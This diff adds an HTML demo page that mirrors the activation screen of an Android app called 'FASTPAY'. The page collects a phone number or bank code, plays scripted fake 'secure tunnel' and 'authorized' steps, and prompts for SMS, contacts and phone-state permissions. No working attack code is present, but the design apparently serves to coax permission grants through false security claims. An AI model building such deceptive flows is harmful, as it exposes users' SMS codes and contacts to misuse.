@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<!--
+  APK SYNC: ActivationActivity demo - kept in sync with FASTPAY_BASE
+  When APK updates: see APK_SYNC_SPEC.md for checklist
+  Config: apk-config.js (regenerate: scripts/extract-apk-values.ps1)
+  APK IDs: activationHeaderSection, activationFormCard, activationInputCard, activationActivateButton,
+           activationStatusCard, activationStatusCardStatusText, activationStatusStepValidate, etc.
+-->
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>FASTPAY — Activation</title>
+  <style>
+    /* APK: colors.xml theme_primary #00ff88, theme_border #4D00ff88 */
+    :root {
+      --neon: #00ff88;
+      --neon-dim: rgba(0, 255, 136, 0.5);
+      --neon-border: rgba(0, 255, 136, 0.2);
+      --neon-shimmer: rgba(0, 255, 136, 0.08);
+      --neon-glow: 0 0 10px var(--neon-dim), 0 0 20px var(--neon-dim);
+      --bg: #1a1d21;
+      --card-bg: rgba(5, 26, 26, 0.9);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: monospace, system-ui, -apple-system, sans-serif;
+      background: #0d0d0d;
+      color: var(--neon);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    /* Grid background */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
+      background-size: 24px 24px;
+      pointer-events: none;
+      z-index: 0;
+    }
+    /* Mobile phone frame */
+    .phone-frame {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 400px;
+      aspect-ratio: 9 / 19.5;
+      max-height: min(90vh, 844px);
+      background: #1c1c1e;
+      border-radius: 44px;
+      padding: 12px;
+      box-shadow:
+        0 0 0 3px #2c2c2e,
+        0 0 0 6px #1c1c1e,
+        0 20px 60px rgba(0, 0, 0, 0.5),
+        inset 0 0 0 1px rgba(255, 255, 255, 0.05);
+    }
+    .phone-screen {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background: var(--bg);
+      border-radius: 34px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .screen {
+      position: relative;
+      flex: 1;
+      max-width: 100%;
+      margin: 0;
+      min-height: 0;
+      display: flex;
+      flex-direction: column;
+      overflow-y: auto;
+      perspective: 1200px;
+    }
+    /* Status bar */
+    .status-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 20px 8px;
+      font-size: 0.85rem;
+      color: #8b949e;
+    }
+    .status-bar .time { font-weight: 500; }
+    .status-bar .icons { display: flex; gap: 8px; }
+    /* Header */
+    .header {
+      text-align: center;
+      padding: 24px 20px 16px;
+    }
+    .logo {
+      font-size: 2.25rem;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      color: var(--neon);
+      text-shadow: 0 0 30px var(--neon-dim);
+    }
+    .tagline {
+      font-size: 0.75rem;
+      color: var(--neon-dim);
+      letter-spacing: 0.03em;
+      margin-top: 8px;
+      opacity: 0.7;
+    }
+    /* Main card wrapper (outer dashed border) */
+    .main-card-wrapper {
+      margin: 0 20px 0;
+      padding: 3px;
+      border: 2px dashed var(--neon);
+      border-radius: 16px;
+      background: transparent;
+      transform-origin: center top;
+      transition: transform 350ms ease-out;
+    }
+    .main-card-wrapper.recede {
+      transform: scale(0.85) rotateY(5deg);
+    }
+    /* Main card (inner with shimmer) */
+    .main-card {
+      padding: 20px;
+      background: var(--card-bg);
+      border: 1px solid var(--neon-border);
+      border-radius: 12px;
+      position: relative;
+      overflow: hidden;
+    }
+    .main-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, transparent 0%, var(--neon-shimmer) 50%, transparent 100%);
+      pointer-events: none;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .secure-label {
+      font-size: 0.875rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: var(--neon);
+    }
+    .sha-chip {
+      padding: 4px 10px;
+      font-size: 0.69rem;
+      font-weight: 600;
+      letter-spacing: 0.1em;
+      color: var(--neon);
+      border: 1px solid var(--neon);
+      border-radius: 4px;
+      background: transparent;
+    }
+    /* Mode row with divider */
+    .mode-row {
+      display: flex;
+      align-items: stretch;
+      margin-bottom: 12px;
+      background: transparent;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .mode-btn {
+      flex: 1;
+      padding: 10px;
+      font-size: 0.81rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      cursor: pointer;
+      text-align: center;
+      border: none;
+      background: transparent;
+      color: var(--neon);
+      font-family: inherit;
+    }
+    .mode-btn.active {
+      background: var(--neon);
+      color: #000000;
+    }
+    .mode-btn:not(.active) {
+      opacity: 0.6;
+    }
+    .mode-btn:not(.active):hover {
+      background: rgba(0, 255, 136, 0.1);
+      opacity: 0.8;
+    }
+    .mode-divider {
+      width: 1px;
+      background: var(--neon-border);
+      margin: 8px 0;
+    }
+    .input-row {
+      margin-bottom: 12px;
+    }
+    .input-container {
+      position: relative;
+      transform-origin: center center;
+      transition: transform 200ms ease-out;
+    }
+    /* APK: setupInputFieldAnimation cardView6 scale 1.02 on focus, 200ms */
+    .input-container.focused {
+      transform: scale(1.02);
+    }
+    .input-field {
+      width: 100%;
+      padding: 12px 16px;
+      font-size: 1.125rem;
+      color: var(--neon);
+      background: transparent;
+      border: 1px solid var(--neon-border);
+      border-radius: 0;
+      outline: none;
+      letter-spacing: 0.02em;
+      font-family: inherit;
+    }
+    .input-field::placeholder {
+      color: var(--neon-dim);
+    }
+    .input-field:focus {
+      border-color: var(--neon);
+      box-shadow: 0 0 0 1px var(--neon-dim);
+    }
+    /* APK: status_error #F44336, shakeView 400ms DecelerateInterpolator */
+    .input-field.error {
+      color: #F44336;
+    }
+    .input-container.shake {
+      animation: inputShake 400ms ease-out;
+    }
+    .input-container.shake.focused {
+      animation: inputShakeFocused 400ms ease-out;
+    }
+    @keyframes inputShake {
+      0%, 100% { transform: translateX(0); }
+      12% { transform: translateX(20px); }
+      24% { transform: translateX(-20px); }
+      36% { transform: translateX(20px); }
+      48% { transform: translateX(-20px); }
+      60% { transform: translateX(10px); }
+      72% { transform: translateX(-10px); }
+    }
+    @keyframes inputShakeFocused {
+      0%, 100% { transform: translateX(0) scale(1.02); }
+      12% { transform: translateX(20px) scale(1.02); }
+      24% { transform: translateX(-20px) scale(1.02); }
+      36% { transform: translateX(20px) scale(1.02); }
+      48% { transform: translateX(-20px) scale(1.02); }
+      60% { transform: translateX(10px) scale(1.02); }
+      72% { transform: translateX(-10px) scale(1.02); }
+    }
+    .button-row {
+      display: flex;
+      gap: 8px;
+      margin-top: 8px;
+    }
+    .activate-btn,
+    .clear-btn {
+      flex: 1;
+      padding: 14px 20px;
+      font-size: 0.875rem;
+      font-weight: 700;
+      letter-spacing: 0.05em;
+      border-radius: 0;
+      cursor: pointer;
+      user-select: none;
+      transform-origin: center center;
+      transition: none;
+      text-align: center;
+      font-family: inherit;
+    }
+    .activate-btn {
+      background: var(--neon);
+      color: #000000;
+      border: none;
+      box-shadow: var(--neon-glow);
+    }
+    .activate-btn:hover { filter: brightness(1.1); }
+    .activate-btn:disabled { cursor: default; opacity: 0.95; }
+    .clear-btn {
+      background: transparent;
+      color: var(--neon);
+      border: 2px solid var(--neon);
+    }
+    .clear-btn:hover { background: rgba(0, 255, 136, 0.1); }
+    .activate-btn:active, .clear-btn:active { outline: none; }
+    /* Status card (activation progress) */
+    .status-card {
+      margin: 20px 20px 24px;
+      padding: 20px;
+      background: var(--card-bg);
+      border: 1px solid var(--neon-border);
+      border-radius: 12px;
+      min-height: 120px;
+      visibility: hidden;
+      position: relative;
+      overflow: hidden;
+      transform-origin: center top;
+      transition: transform 350ms ease-out, opacity 600ms ease-out;
+    }
+    .status-card.recede {
+      transform: scale(0.85) rotateY(-5deg);
+      opacity: 0.4;
+    }
+    .status-card::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, transparent 0%, var(--neon-shimmer) 50%, transparent 100%);
+      pointer-events: none;
+    }
+    .status-card.visible {
+      visibility: visible;
+    }
+    .status-title {
+      font-size: 0.875rem;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      color: var(--neon);
+      margin-bottom: 8px;
+    }
+    .status-main {
+      font-size: 0.75rem;
+      color: var(--neon);
+      line-height: 1.5;
+      letter-spacing: 0.04em;
+      opacity: 0.8;
+      margin-bottom: 16px;
+    }
+    .status-steps {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .status-step {
+      font-size: 0.75rem;
+      color: var(--neon);
+      letter-spacing: 0.04em;
+      opacity: 0.6;
+      transition: opacity 0.2s ease;
+    }
+    .status-step.active {
+      opacity: 1;
+    }
+    .status-step-with-buffer {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .status-step-with-buffer .status-step-buffer {
+      width: 12px;
+      height: 12px;
+      border: 2px solid var(--neon-border);
+      border-top-color: var(--neon);
+      border-radius: 50%;
+      animation: bufferSpin 0.8s linear infinite;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+    .status-step-with-buffer .status-step-buffer.visible {
+      opacity: 1;
+    }
+    .status-step-with-buffer.buffering {
+      opacity: 0.9;
+    }
+    @keyframes bufferSpin {
+      to { transform: rotate(360deg); }
+    }
+    .status-result {
+      font-size: 0.75rem;
+      color: var(--neon);
+      letter-spacing: 0.04em;
+      opacity: 0.6;
+      margin-top: 6px;
+    }
+    .retry-container {
+      display: none;
+      margin-top: 16px;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    .retry-container.visible {
+      display: flex;
+    }
+    .retry-status {
+      flex: 1;
+      font-size: 0.69rem;
+      color: var(--neon);
+      opacity: 0.8;
+    }
+    .retry-btn {
+      padding: 4px 10px;
+      font-size: 0.625rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: var(--neon);
+      background: transparent;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .retry-btn:hover { text-decoration: underline; }
+    /* Permission/Update Prompt Overlay - APK: activationPermissionPromptOverlay + activation_prompt_card */
+    .prompt-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 150ms ease-out;
+      border-radius: 34px;
+    }
+    .prompt-overlay.visible {
+      opacity: 1;
+      visibility: visible;
+    }
+    .prompt-card {
+      width: 100%;
+      max-width: 320px;
+      padding: 20px;
+      background: var(--card-bg);
+      border: 1px solid var(--neon-border);
+      border-radius: 12px;
+      box-shadow: var(--neon-glow);
+      transform-origin: center center;
+    }
+    .prompt-card-title {
+      font-size: 0.875rem;
+      font-weight: 700;
+      letter-spacing: 0.06em;
+      color: var(--neon);
+      margin-bottom: 12px;
+    }
+    .prompt-card-text {
+      font-size: 0.75rem;
+      color: var(--neon);
+      opacity: 0.8;
+      letter-spacing: 0.04em;
+      line-height: 1.6;
+      min-height: 4em;
+    }
+    .prompt-card.born-from {
+      animation: promptCardBorn 350ms ease-out forwards;
+    }
+    .prompt-card.reverse {
+      animation: promptCardReverse 350ms ease-out forwards;
+    }
+    @keyframes promptCardBorn {
+      from {
+        transform: scale(0.3);
+        opacity: 0;
+      }
+      to {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+    @keyframes promptCardReverse {
+      from {
+        transform: scale(1);
+        opacity: 1;
+      }
+      to {
+        transform: scale(0.3);
+        opacity: 0;
+      }
+    }
+    /* Footer */
+    .footer {
+      flex: 1;
+      display: flex;
+      align-items: flex-end;
+      justify-content: center;
+      padding-bottom: 24px;
+    }
+    .nav-hint {
+      width: 120px;
+      height: 4px;
+      background: #4a4d52;
+      border-radius: 2px;
+    }
+    /* APK: animateButtonPress 100ms down, 150ms up Overshoot; startActivationButtonsAnimation 4000ms */
+    .activate-btn.press-scale-down {
+      animation: scaleDown 100ms ease-out forwards;
+    }
+    .activate-btn.press-scale-up {
+      animation: scaleUp 150ms cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+    }
+    .activate-btn.loading-scale {
+      animation: activateLoading 4000ms ease-out forwards;
+    }
+    .clear-btn.loading-scale {
+      animation: clearLoading 4000ms ease-out forwards;
+    }
+    @keyframes scaleDown {
+      from { transform: scale(1); }
+      to { transform: scale(0.95); }
+    }
+    @keyframes scaleUp {
+      from { transform: scale(0.95); }
+      to { transform: scale(1); }
+    }
+    @keyframes activateLoading {
+      from { transform: scale(1); }
+      to { transform: scale(1.08, 1.04); }
+    }
+    @keyframes clearLoading {
+      from { transform: scale(1); }
+      to { transform: scale(0.92); }
+    }
+  </style>
+</head>
+<body>
+  <div class="phone-frame">
+    <div class="phone-screen">
+      <div class="screen">
+    <div class="status-bar">
+      <span class="time">1:52 AM</span>
+      <span class="icons">📶 📡 🔋 ID</span>
+    </div>
+
+    <header class="header">
+      <h1 class="logo">FASTPAY</h1>
+      <p class="tagline">The Real Gaming Platform</p>
+    </header>
+
+    <div class="main-card-wrapper">
+      <div class="main-card">
+        <div class="info-row">
+          <span class="secure-label">#123 ALWAYS SECURE</span>
+          <span class="sha-chip">SHA256</span>
+        </div>
+        <div class="mode-row">
+          <button class="mode-btn active">TESTING</button>
+          <div class="mode-divider"></div>
+          <button class="mode-btn">RUNNING</button>
+        </div>
+        <div class="input-row">
+          <div class="input-container" id="inputContainer">
+            <input type="text" class="input-field" placeholder="" id="phoneInput">
+          </div>
+        </div>
+        <div class="button-row">
+          <button class="activate-btn" id="activateBtn">ACTIVATE</button>
+          <button class="clear-btn" id="clearBtn">CLEAR</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="status-card" id="statusCard">
+      <div class="status-title">ACTIVATION</div>
+      <div class="status-main" id="statusMain"></div>
+      <div class="status-steps">
+        <div class="status-step" id="stepValidate">• IP Connection Established</div>
+        <div class="status-step status-step-with-buffer" id="stepRegisterWrap">
+          <span id="stepRegister">• Request Sent / Compatibility test</span>
+          <span class="status-step-buffer" id="stepRegisterBuffer" aria-hidden="true"></span>
+        </div>
+        <div class="status-step" id="stepSync">• Response Decrypted</div>
+        <div class="status-step" id="stepAuth">• Authorization Check (Approved / Denied)</div>
+        <div class="status-step" id="stepResult"></div>
+      </div>
+      <div class="retry-container" id="retryContainer">
+        <span class="retry-status" id="retryStatus">Retrying in 5s...</span>
+        <button class="retry-btn" id="retryBtn">RETRY NOW</button>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div class="nav-hint"></div>
+    </div>
+      </div>
+
+    <!-- Permission/Update Prompt Overlay - APK: showActivationPromptCard -->
+    <div class="prompt-overlay" id="promptOverlay">
+      <div class="prompt-card" id="promptCard">
+        <div class="prompt-card-title">PERMISSIONS</div>
+        <div class="prompt-card-text" id="promptCardText"></div>
+      </div>
+    </div>
+    </div>
+  </div>
+
+  <script>
+    /* APK: ActivationActivity.kt - See APK_SYNC_SPEC.md, apk-config.js */
+    const activateBtn = document.getElementById('activateBtn');
+    const clearBtn = document.getElementById('clearBtn');
+    const statusCard = document.getElementById('statusCard');
+    const statusMain = document.getElementById('statusMain');
+    const promptOverlay = document.getElementById('promptOverlay');
+    const promptCard = document.getElementById('promptCard');
+    const promptCardText = document.getElementById('promptCardText');
+    const stepValidate = document.getElementById('stepValidate');
+    const stepRegisterWrap = document.getElementById('stepRegisterWrap');
+    const stepRegister = document.getElementById('stepRegister');
+    const stepRegisterBuffer = document.getElementById('stepRegisterBuffer');
+    const stepSync = document.getElementById('stepSync');
+    const stepAuth = document.getElementById('stepAuth');
+    const stepResult = document.getElementById('stepResult');
+    const retryContainer = document.getElementById('retryContainer');
+    const retryStatus = document.getElementById('retryStatus');
+    const retryBtn = document.getElementById('retryBtn');
+    const phoneInput = document.getElementById('phoneInput');
+    const inputContainer = document.getElementById('inputContainer');
+
+    const STATUS_TEXT = 'Creating secure tunnel with company database'; /* APK: activationProgressStatus */
+    const steps = [stepValidate, stepRegisterWrap, stepSync, stepAuth];
+
+    /* APK: activation_prompt_card - "• Receive SMS", "• Read SMS", "• Read Contacts", "• Read Phone State" */
+    const PROMPT_PERMISSION_LINES = ['• Receive SMS', '• Read SMS', '• Read Contacts', '• Read Phone State'];
+    const PROMPT_CHAR_DELAY_MS = 45;  /* APK: PROMPT_CARD_PER_CHAR_DELAY_MS */
+    const PROMPT_ANIM_MS = 350;       /* APK: PROMPT_CARD_ANIM_DURATION_MS */
+
+    let hintAnimationId = null;
+
+    function showPromptCard(onComplete) {
+      promptOverlay.classList.add('visible');
+      document.querySelector('.main-card-wrapper')?.classList.add('recede');
+      document.getElementById('statusCard')?.classList.add('recede');
+      promptCardText.textContent = '';
+      promptCard.classList.remove('born-from', 'reverse');
+      void promptCard.offsetWidth;
+
+      promptCard.classList.add('born-from');
+      let lineIndex = 0, charIndex = 0;
+      function typeTick() {
+        if (lineIndex >= PROMPT_PERMISSION_LINES.length) {
+          setTimeout(() => {
+            promptCard.classList.remove('born-from');
+            promptCard.classList.add('reverse');
+            setTimeout(() => {
+              promptOverlay.classList.remove('visible');
+              promptCard.classList.remove('reverse');
+              document.querySelector('.main-card-wrapper')?.classList.remove('recede');
+              document.getElementById('statusCard')?.classList.remove('recede');
+              onComplete();
+            }, PROMPT_ANIM_MS);
+          }, 200);
+          return;
+        }
+        const line = PROMPT_PERMISSION_LINES[lineIndex];
+        const next = charIndex + 1;
+        if (next <= line.length) {
+          const soFar = PROMPT_PERMISSION_LINES.slice(0, lineIndex).join('\n') +
+            (lineIndex > 0 ? '\n' : '') + line.substring(0, next);
+          promptCardText.textContent = soFar;
+          charIndex = next;
+        }
+        if (charIndex >= line.length) {
+          lineIndex++;
+          charIndex = 0;
+        }
+        setTimeout(typeTick, PROMPT_CHAR_DELAY_MS);
+      }
+      setTimeout(typeTick, PROMPT_ANIM_MS + 100);
+    }
+
+    function getHintTextForCurrentMode() {
+      const isTesting = document.querySelector('.mode-btn.active').textContent === 'TESTING';
+      return isTesting ? 'Enter Your Phone Number' : 'Enter Your Bank Code';
+    }
+
+    function animateHintText() {
+      if (hintAnimationId) clearTimeout(hintAnimationId);
+      phoneInput.placeholder = '';
+      const hintText = getHintTextForCurrentMode();
+      let i = 0;
+      function tick() {
+        if (phoneInput.value.length > 0) return;
+        if (i < hintText.length) {
+          phoneInput.placeholder = hintText.substring(0, i + 1);
+          i++;
+          hintAnimationId = setTimeout(tick, 80); /* APK: animateHintText perChar 80ms */
+        }
+      }
+      hintAnimationId = setTimeout(tick, 200); /* APK: animateHintText 80ms/char, 200ms start */
+    }
+
+    function shakeView(el) {
+      el.classList.remove('shake');
+      void el.offsetWidth;
+      el.classList.add('shake');
+      setTimeout(() => el.classList.remove('shake'), 400);
+    }
+
+    function validateInput() {
+      const raw = phoneInput.value.replace(/\s/g, '').replace(/-/g, '');
+      const isTesting = document.querySelector('.mode-btn.active').textContent === 'TESTING';
+      if (isTesting) {
+        const digits = raw.replace(/\D/g, '');
+        return digits.length === 10;
+      }
+      return /^[A-Za-z]{4}\d{4}$/.test(raw.toUpperCase());
+    }
+
+    function showInputError() {
+      phoneInput.classList.add('error');
+      shakeView(inputContainer);
+      setTimeout(() => phoneInput.classList.remove('error'), 200);
+    }
+
+    function resetStatusCard() {
+      statusMain.textContent = '';
+      stepResult.textContent = '';
+      retryContainer.classList.remove('visible');
+      steps.forEach(s => s.classList.remove('active'));
+      stepRegisterWrap?.classList.remove('buffering');
+      stepRegisterBuffer?.classList.remove('visible');
+    }
+
+    function typeStatus(text, onComplete) {
+      let i = 0;
+      statusMain.textContent = '';
+      const perChar = Math.max(20, 4000 / text.length);
+      const id = setInterval(() => {
+        if (i < text.length) {
+          statusMain.textContent += text[i++];
+        } else {
+          clearInterval(id);
+          onComplete?.();
+        }
+      }, perChar);
+      return () => clearInterval(id);
+    }
+
+    function highlightStep(index) {
+      steps.forEach((s, i) => {
+        s.classList.toggle('active', i <= index);
+      });
+    }
+
+    phoneInput.addEventListener('focus', () => inputContainer.classList.add('focused'));
+    phoneInput.addEventListener('blur', () => inputContainer.classList.remove('focused'));
+    phoneInput.addEventListener('input', () => { if (hintAnimationId) clearTimeout(hintAnimationId); });
+
+    clearBtn.addEventListener('click', () => {
+      phoneInput.value = '';
+      phoneInput.focus();
+      animateHintText();
+    });
+
+    retryBtn.addEventListener('click', () => {
+      retryContainer.classList.remove('visible');
+      activateBtn.click();
+    });
+
+    /* Mode toggle */
+    document.querySelectorAll('.mode-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        if (phoneInput.value.length === 0) animateHintText();
+      });
+    });
+
+    animateHintText();
+
+    activateBtn.addEventListener('click', function handlePress() {
+      if (activateBtn.disabled) return;
+      if (!validateInput()) {
+        showInputError();
+        return;
+      }
+      activateBtn.disabled = true;
+      resetStatusCard();
+
+      activateBtn.classList.remove('press-scale-down', 'press-scale-up', 'loading-scale');
+      clearBtn.classList.remove('loading-scale');
+      void activateBtn.offsetWidth;
+
+      activateBtn.classList.add('press-scale-down');
+
+      setTimeout(() => {
+        activateBtn.classList.remove('press-scale-down');
+        activateBtn.classList.add('press-scale-up');
+
+        setTimeout(() => {
+          activateBtn.classList.remove('press-scale-up');
+
+          statusCard.classList.add('visible');
+          statusMain.textContent = '';
+
+          activateBtn.classList.add('loading-scale');
+          clearBtn.classList.add('loading-scale');
+          typeStatus(STATUS_TEXT);
+
+          highlightStep(0);
+          setTimeout(() => {
+            /* Step 2: Request Sent / Compatibility test - show buffer, no "right" yet */
+            stepRegisterWrap?.classList.add('buffering');
+            stepRegisterBuffer?.classList.add('visible');
+            /* Permission/Update prompt card - APK: showActivationPromptCard(1) + checkForAppUpdate */
+            /* Further animation stops until update+permission done */
+            showPromptCard(() => {
+              /* Buffer converts to same "right" as others, continue flow */
+              stepRegisterWrap?.classList.remove('buffering');
+              stepRegisterBuffer?.classList.remove('visible');
+              highlightStep(1);
+              setTimeout(() => {
+                highlightStep(2);
+                setTimeout(() => {
+                  highlightStep(3);
+                  setTimeout(() => {
+                    stepResult.textContent = '• AUTHORIZED';
+                    stepResult.classList.add('active');
+                    setTimeout(() => {
+                      statusCard.classList.remove('visible');
+                      activateBtn.classList.remove('loading-scale');
+                      clearBtn.classList.remove('loading-scale');
+                      resetStatusCard();
+                      activateBtn.disabled = false;
+                    }, 400);
+                  }, 400);
+                }, 400);
+              }, 400);
+            });
+          }, 1600);
+        }, 150);
+      }, 100);
+    });
+  </script>
+</body>
+</html>
